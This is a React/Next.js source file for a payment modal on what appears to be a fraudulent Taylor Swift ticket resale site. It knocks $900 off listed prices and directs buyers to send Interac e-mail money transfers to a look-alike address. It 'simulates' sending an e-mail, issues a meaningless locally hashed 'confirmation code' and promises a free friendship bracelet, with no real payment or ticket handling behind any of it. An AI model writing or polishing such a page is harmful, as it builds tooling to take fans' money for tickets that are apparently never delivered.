"use client";

import React, { useState } from "react";
import Image from "next/image";
import { useRouter } from "next/navigation";

const PaymentModal = ({ isOpen, onClose, ticket, seats }) => {
  const [name, setName] = useState("");
  const [email, setEmail] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [message, setMessage] = useState("");
  const [code, setCode] = useState("");

  const router = useRouter();

  if (!isOpen) return null; // If modal is not open, return nothing.

  const generateCode = (email, ticket, seats) => {
    const input = email + JSON.stringify(ticket) + seats;
    let hash = 0;
    for (let i = 0; i < input.length; i++) {
      const chr = input.charCodeAt(i);
      hash = (hash << 5) - hash + chr;
      hash |= 0; // Convert to 32bit integer
    }
    const code = Math.abs(hash) % 100000; // Ensure it's positive and get last 5 digits
    return code.toString().padStart(5, "0");
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);
    setMessage("");

    // Simulating email sending and code generation
    setTimeout(() => {
      setIsSubmitting(false);
      const generatedCode = generateCode(email, ticket, seats);
      setCode(generatedCode);
      setMessage(
        "Thanks for signing up! We’ll send you a free Taylor Swift friendship bracelet for attending the event."
      );
      setName("");
      setEmail("");
    }, 2000); // Simulating a 2-second delay for email sending
  };

  return (
    <div className="fixed inset-0 bg-opacity-60 flex justify-end items-start z-50">
      <div className="bg-white w-[512px] h-[100vh] -mt-4 shadow-2xl p-6 rounded-l-lg space-y-6 overflow-y-auto">
        <button
          onClick={onClose}
          className="text-lg text-blue-600 hover:text-blue-800 focus:outline-none mb-6"
        >
          ← Back to ticket
        </button>

        {/* Image and Ticket Details */}
        <div className="flex space-x-4">
          <div className="relative w-32 h-24 rounded-lg overflow-hidden shadow-md">
            <Image
              src={ticket.imgUrl}
              alt={ticket.section}
              layout="fill"
              objectFit="cover"
            />
          </div>

          <div className="flex-1">
            <h2 className="text-xl font-semibold text-gray-800">
              {ticket.section}
            </h2>
            <p className="text-sm text-gray-500">{ticket.tickets} tickets</p>

            {/* Labels */}
            <div className="space-y-2 mt-4">
              {ticket.instantDownload && (
                <p className="flex items-center text-blue-600 font-medium">
                  ⚡ <span className="ml-2">Instant Download</span>
                </p>
              )}
              {ticket.obstructedView && (
                <p className="text-yellow-600">Limited or obstructed view</p>
              )}
              {ticket.standingOnly && (
                <p className="text-red-500">Standing room only (SRO)</p>
              )}
              {ticket.oneOfTheBest && (
                <p className="text-pink-600 font-medium">
                  One of the best-selling sections
                </p>
              )}
              {ticket.cheapest && (
                <p className="flex items-center text-green-600 font-medium">
                  💲 <span className="ml-2">Cheapest</span>
                </p>
              )}
            </div>
          </div>

          {/* Price and Rating */}
          <div className="flex flex-col items-end space-y-2">
            <p className="text-2xl font-semibold text-gray-800">
              ${ticket.currentPrice - 900}
            </p>
            <p className="text-xs text-gray-500">each</p>

            <div className="flex items-center mt-2 space-x-2">
              {ticket.rating && (
                <span className="bg-green-200 text-green-800 text-xs font-semibold px-2 py-0.5 rounded">
                  {ticket.rating.toFixed(1)}
                </span>
              )}
              <span className="text-sm text-gray-600">
                {ticket.ratingLabel}
              </span>
            </div>
          </div>
        </div>

        {/* Payment Instructions */}
        <div className="mt-6">
          <p className="text-sm text-gray-700">
            Pay us --TaylorSwift Tickets-- $
            {(ticket.currentPrice > 900
              ? ticket.currentPrice - 900
              : ticket.currentPrice) * seats}{" "}
            by INTERAC email money by sending payment to{" "}
            <span className="font-semibold text-blue-600">
            ticketsales@taylorswifttickets.ca
            </span>
          </p>
        </div>

        {/* User Input Form */}
        {!code && (
          <form onSubmit={handleSubmit} className="mt-6 space-y-4">
            <div>
              <label htmlFor="name" className="block text-sm text-gray-700">
                Your Name
              </label>
              <input
                type="text"
                id="name"
                value={name}
                onChange={(e) => setName(e.target.value)}
                className="w-full mt-2 p-2 border border-gray-300 rounded-md"
                required
                disabled={isSubmitting}
              />
            </div>
            <div>
              <label htmlFor="email" className="block text-sm text-gray-700">
                Your Email
              </label>
              <input
                type="email"
                id="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="w-full mt-2 p-2 border border-gray-300 rounded-md"
                required
                disabled={isSubmitting}
              />
            </div>

            {message && <p className="text-sm text-green-600">{message}</p>}

            <div>
              <button
                disabled={isSubmitting}
                className="w-full bg-blue-600 text-white py-2 px-4 rounded-md"
              >
                {isSubmitting ? "Processing..." : "Buy Now!"}
              </button>
            </div>
          </form>
        )}

        {/* Confirmation Code and Instructions */}
        {code && (
          <div className="mt-6">
            <p className="text-sm text-green-600">{message}</p>
            <div className="mt-4">
              <p className="text-sm text-gray-700">
                Please write down your confirmation code:{" "}
                <span className="font-bold">{code}</span>
              </p>
              <p className="text-sm text-gray-700">
                Use this code when you send the email money transfer.
              </p>
              <button
                onClick={() => router.push("/instructions")}
                className="mt-4 w-full bg-green-600 text-white py-2 px-4 rounded-md"
              >
                Continue to Instructions
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default PaymentModal;
